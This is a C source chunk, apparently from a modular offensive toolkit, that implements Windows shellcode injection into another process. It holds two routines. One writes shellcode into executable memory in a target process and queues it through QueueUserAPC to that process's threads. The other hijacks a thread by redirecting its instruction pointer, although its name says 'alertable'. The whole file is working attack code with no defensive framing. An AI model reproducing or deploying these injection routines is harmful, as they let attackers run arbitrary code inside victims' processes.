// chunk: injection/apc_inject
// depends: (none)
// provides: inject_apc
// headers: windows.h, tlhelp32.h
// note: APC injection via QueueUserAPC

#ifndef CHUNK_INJECTION_APC_INJECT
#define CHUNK_INJECTION_APC_INJECT

static int inject_apc(DWORD target_pid, unsigned char *shellcode, DWORD sc_size) {
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, target_pid);
    if (!hProcess) {
        return 0;
    }

    PVOID remote_buf = VirtualAllocEx(hProcess, NULL, sc_size,
                                      MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remote_buf) {
        CloseHandle(hProcess);
        return 0;
    }

    if (!WriteProcessMemory(hProcess, remote_buf, shellcode, sc_size, NULL)) {
        VirtualFreeEx(hProcess, remote_buf, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 0;
    }

    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (hSnap == INVALID_HANDLE_VALUE) {
        VirtualFreeEx(hProcess, remote_buf, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 0;
    }

    THREADENTRY32 te = {0};
    te.dwSize = sizeof(te);
    int queued = 0;

    if (Thread32First(hSnap, &te)) {
        do {
            if (te.th32OwnerProcessID == target_pid) {
                HANDLE hThread = OpenThread(THREAD_SET_CONTEXT | THREAD_SUSPEND_RESUME,
                                            FALSE, te.th32ThreadID);
                if (hThread) {
                    if (QueueUserAPC((PAPCFUNC)remote_buf, hThread, 0)) {
                        queued++;
                    }
                    CloseHandle(hThread);
                }
            }
        } while (Thread32Next(hSnap, &te));
    }

    CloseHandle(hSnap);
    CloseHandle(hProcess);

    return queued > 0 ? 1 : 0;
}

static int inject_apc_alertable(DWORD target_pid, unsigned char *shellcode, DWORD sc_size) {
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, target_pid);
    if (!hProcess) return 0;

    PVOID remote_buf = VirtualAllocEx(hProcess, NULL, sc_size,
                                      MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remote_buf) {
        CloseHandle(hProcess);
        return 0;
    }

    WriteProcessMemory(hProcess, remote_buf, shellcode, sc_size, NULL);

    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (hSnap == INVALID_HANDLE_VALUE) {
        CloseHandle(hProcess);
        return 0;
    }

    THREADENTRY32 te = {0};
    te.dwSize = sizeof(te);
    int success = 0;

    if (Thread32First(hSnap, &te)) {
        do {
            if (te.th32OwnerProcessID == target_pid) {
                HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, te.th32ThreadID);
                if (hThread) {
                    SuspendThread(hThread);

                    CONTEXT ctx = {0};
                    ctx.ContextFlags = CONTEXT_FULL;
                    GetThreadContext(hThread, &ctx);

#ifdef _WIN64
                    ctx.Rip = (DWORD64)remote_buf;
#else
                    ctx.Eip = (DWORD)remote_buf;
#endif

                    SetThreadContext(hThread, &ctx);
                    ResumeThread(hThread);
                    success = 1;
                    CloseHandle(hThread);
                    break;
                }
            }
        } while (Thread32Next(hSnap, &te));
    }

    CloseHandle(hSnap);
    CloseHandle(hProcess);
    return success;
}

#endif
